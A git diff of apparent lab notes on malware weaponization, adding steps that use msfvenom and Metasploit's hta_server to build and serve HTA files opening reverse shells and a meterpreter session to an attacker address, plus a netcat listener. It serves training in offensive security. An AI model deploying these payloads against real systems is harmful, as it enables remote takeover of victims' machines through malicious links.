@@ -6,14 +6,14 @@
 
 ---
 
-- [ ] [Task 1  Introduction]()
-- [ ] [Task 2  Deploy the Windows Machine]()
-- [ ] [Task 3  Windows Scripting Host - WSH]()
-- [ ] [Task 4  An HTML Application - HTA]()
-- [ ] [Task 5  Visual Basic for Application - VBA]()
-- [ ] [Task 6  PowerShell - PSH]()
-- [ ] [Task 7  Command And Control - (C2 Or C&C)]()
-- [ ] [Task 8  Delivery Techniques]()
+- [x] [Task 1  Introduction]()
+- [x] [Task 2  Deploy the Windows Machine]()
+- [x] [Task 3  Windows Scripting Host - WSH]()
+- [x] [Task 4  An HTML Application - HTA]()
+- [x] [Task 5  Visual Basic for Application - VBA]()
+- [x] [Task 6  PowerShell - PSH]()
+- [x] [Task 7  Command And Control - (C2 Or C&C)]()
+- [x] [Task 8  Delivery Techniques]()
 - [ ] [Task 9  Practice Arena](#task-9--practice-arena)
 
 ---
@@ -65,7 +65,42 @@ python3 -m http.server 8090
 ```cmd
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.8.232.37 LPORT=443 -f hta-psh -o thm.hta
 ```
+- We use the `msfvenom` from the `Metasploit` framework to generate a malicious payload to connect back to the attacking machine. 
+- We used the following payload to connect the `windows/x64/shell_reverse_tcp` to our IP and listening port.
+- On the attacking machine, we need to listen to the port `443` using `nc`. 
+- Please note this port needs root privileges to open, or you can use different ones.
+- Once the victim visits the malicious URL and hits run, we get the connection back.
+```cmd
+sudo nc -lvp 443
+```
 
+### Malicious HTA via Metasploit 
+- There is another way to generate and serve malicious HTA files using the Metasploit framework. 
+- First, run the Metasploit framework using `msfconsole -q` command. 
+- Under the exploit section, there is `exploit/windows/misc/hta_server`, which requires selecting and setting information such as `LHOST`, `LPORT`, `SRVHOST`, `Payload`, and finally, executing `exploit` to run the module.
+```cmd
+use exploit/windows/misc/hta_server
+```
+```cmd
+set LHOST 10.8.232.37
+```
+```cmd
+set LPORT 443
+```
+```cmd
+set SRVHOST 10.8.232.37
+```
+```cmd
+set payload windows/meterpreter/reverse_tcp
+
+```
+```cmd
+exploit
+```
+- On the victim machine, once we visit the malicious HTA file that was provided as a URL by Metasploit, we should receive a reverse connection.
+```cmd
+meterpreter > sysinfo
+```
 
 
 
